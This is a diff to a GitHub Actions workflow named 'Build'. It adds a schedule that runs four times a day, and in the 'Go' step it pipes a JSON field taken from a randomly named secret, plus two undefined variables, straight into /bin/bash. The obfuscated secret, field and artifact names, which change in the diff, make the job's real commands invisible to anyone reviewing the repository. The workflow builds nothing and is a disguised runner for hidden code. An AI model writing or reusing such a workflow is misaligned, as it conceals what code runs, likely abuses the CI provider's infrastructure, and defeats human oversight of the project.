@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '38 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,16 +20,16 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          my8: ${{ secrets.my8 }}
+          pnqsd403: ${{ secrets.pnqsd403 }}
         run: |
-          printf '%s' "$my8" | jq -r .t458 | /bin/bash
-          printf '%s' "$dhe3388" | jq -r .h741 | /bin/bash
-          echo $k9458 | jq -r .fzhk75 | /bin/bash
+          printf '%s' "$pnqsd403" | jq -r .zp2 | /bin/bash
+          echo $c978 | jq -r .c9794 | /bin/bash
+          echo $i3530 | jq -r .sg506 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: Spyj1joj
+          name: WfXByhbr
           path: "*.zip"
           retention-days: 1
